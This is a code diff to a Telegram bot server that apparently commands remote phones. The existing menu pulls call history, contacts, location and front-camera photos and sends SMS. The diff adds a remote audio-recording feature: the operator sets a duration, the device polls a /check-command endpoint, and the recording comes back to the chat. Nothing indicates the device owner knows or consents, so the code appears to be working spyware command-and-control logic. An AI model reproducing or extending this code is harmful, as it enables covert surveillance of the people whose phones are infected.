@@ -85,6 +85,9 @@ function sendCommandMenu(ctx, deviceId, deviceName) {
                     Markup.button.callback('📸 Front Camera', `cmd_cf_${deviceId}`),
                     Markup.button.callback('📤 Send SMS',     `cmd_smsmode_${deviceId}`)
                 ],
+                [
+                    Markup.button.callback('🎙️ Record Audio', `cmd_recmode_${deviceId}`)
+                ],
                 [Markup.button.callback('« Back to Devices', 'back_to_devices')]
             ])
         }
@@ -124,7 +127,7 @@ bot.action(/^select_device_(.+)$/, async (ctx) => {
     return sendCommandMenu(ctx, deviceId, device.name);
 });
 
-// Run a command on the selected device (excludes smsmode — handled separately below)
+// Run a command on the selected device (excludes smsmode and recmode — handled separately)
 bot.action(/^cmd_(ch|contact|as|loc|cf)_(.+)$/, async (ctx) => {
     const command = ctx.match[1];
     const deviceId = ctx.match[2];
@@ -156,6 +159,29 @@ bot.action(/^cmd_(ch|contact|as|loc|cf)_(.+)$/, async (ctx) => {
 // smsWizard[chatId] = { step: 'number' | 'message', deviceId, smsTo }
 const smsWizard = {};
 
+// --- Recording Wizard ---
+// recWizard[chatId] = { deviceId }
+const recWizard = {};
+
+// Step 1: user taps "🎙️ Record Audio" button
+bot.action(/^cmd_recmode_(.+)$/, async (ctx) => {
+    const deviceId = ctx.match[1];
+    const device = devices[deviceId];
+    if (!device) { await ctx.answerCbQuery('⚠️ Device offline!'); return; }
+    userSession[ctx.chat.id] = deviceId;
+    recWizard[ctx.chat.id] = { deviceId };
+    await ctx.answerCbQuery();
+    await ctx.editMessageText(
+        `🎙️ *Record Audio from ${device.name}*\n\n━━━━━━━━━━━━━━\n⏱️ *Enter Duration*\n\nPlease type the **recording duration in seconds**:\n\n_Example: 30 (records for 30 seconds)_`,
+        {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard([
+                [Markup.button.callback('❌ Cancel', `select_device_${deviceId}`)]
+            ])
+        }
+    );
+});
+
 // Step 1: user taps "📤 Send SMS" button
 bot.action(/^cmd_smsmode_(.+)$/, async (ctx) => {
     const deviceId = ctx.match[1];
@@ -178,6 +204,43 @@ bot.action(/^cmd_smsmode_(.+)$/, async (ctx) => {
 // Step 2 & 3: intercept user text input for wizard
 bot.on('text', async (ctx) => {
     const chatId = ctx.chat.id;
+
+    // --- Recording Wizard: user sends duration ---
+    if (recWizard[chatId]) {
+        const text = ctx.message.text.trim();
+        const duration = parseInt(text, 10);
+        const { deviceId } = recWizard[chatId];
+        delete recWizard[chatId];
+
+        if (isNaN(duration) || duration <= 0 || duration > 600) {
+            return ctx.reply('❌ Invalid duration. Please enter a number between 1 and 600 seconds.');
+        }
+
+        const device = devices[deviceId];
+        if (!device) {
+            return ctx.reply('⚠️ Device went offline. Please select a device again via /devices.');
+        }
+
+        device.pendingCommand = 'rec';
+        device.requestingChatId = chatId;
+        deviceExtras[deviceId] = { recDuration: duration };
+
+        await ctx.reply(
+            `🎙️ *Recording Queued!*\n\n` +
+            `📱 Device  : *${device.name}*\n` +
+            `⏱️ Duration : *${duration} seconds*\n\n` +
+            `_Recording will start within ~10 seconds and the audio file will be sent here automatically._`,
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('🎙️ Record Again', `cmd_recmode_${deviceId}`)],
+                    [Markup.button.callback('« Back to Menu', `select_device_${deviceId}`)]
+                ])
+            }
+        );
+        return;
+    }
+
     const wizard = smsWizard[chatId];
 
     // If not in wizard mode, check for /ms command handled separately
@@ -290,6 +353,12 @@ app.get('/check-command', (req, res) => {
             const extra = deviceExtras[deviceId];
             delete deviceExtras[deviceId];
             return res.json({ command: cmd, smsTo: extra.smsTo, smsBody: extra.smsBody });
+        }
+        // For rec command, attach duration
+        if (cmd === 'rec' && deviceExtras[deviceId]) {
+            const extra = deviceExtras[deviceId];
+            delete deviceExtras[deviceId];
+            return res.json({ command: cmd, duration: extra.recDuration });
         }
         return res.json({ command: cmd });
     }
